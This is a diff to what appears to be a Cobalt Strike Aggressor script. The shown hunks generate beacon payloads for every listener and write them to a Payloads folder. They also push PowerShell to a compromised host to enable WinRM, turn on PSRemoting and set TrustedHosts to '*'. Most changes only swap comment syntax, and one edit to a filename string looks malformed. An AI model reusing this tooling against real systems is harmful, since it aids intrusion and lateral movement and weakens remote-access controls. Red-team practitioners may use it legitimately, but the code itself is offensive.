@@ -24,12 +24,12 @@ popup beacon_bottom
 			mkdir(script_resource("Payloads"));
 			mkdir(script_resource("Tools"));
 
-		        // Generate payloads for all available listeners
+		        # Generate payloads for all available listeners
 		        foreach $listener (listeners()) {
 		            $name = listener_name($listener);
 		            $ext = listener_extension($listener);
 		            $data = artifact_payload($name, $ext, "x64", "process", "None");
-		            $outfile = getFileProper(script_resource("Payloads"), "$name.$ext");
+		            $outfile = getFileProper(script_resource("Payloads"), $name".$ext");
 		            $handle = openf("> $outfile");
 		            writeb($handle, $data);
 		            closef($handle);
@@ -86,11 +86,11 @@ popup beacon_bottom
         		{
         			binput($1, "Enabling WinRM...");
         	
-        			// Enable WinRM service
+        			# Enable WinRM service
         			bpowerpick($1, "Set-Service WinRM -StartupType Automatic");
         			bpowerpick($1, "Start-Service WinRM");
         	
-        			// Configure WinRM listener
+        			# Configure WinRM listener
         			bpowerpick($1, "Enable-PSRemoting -Force");
         			bpowerpick($1, "Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force");
         	
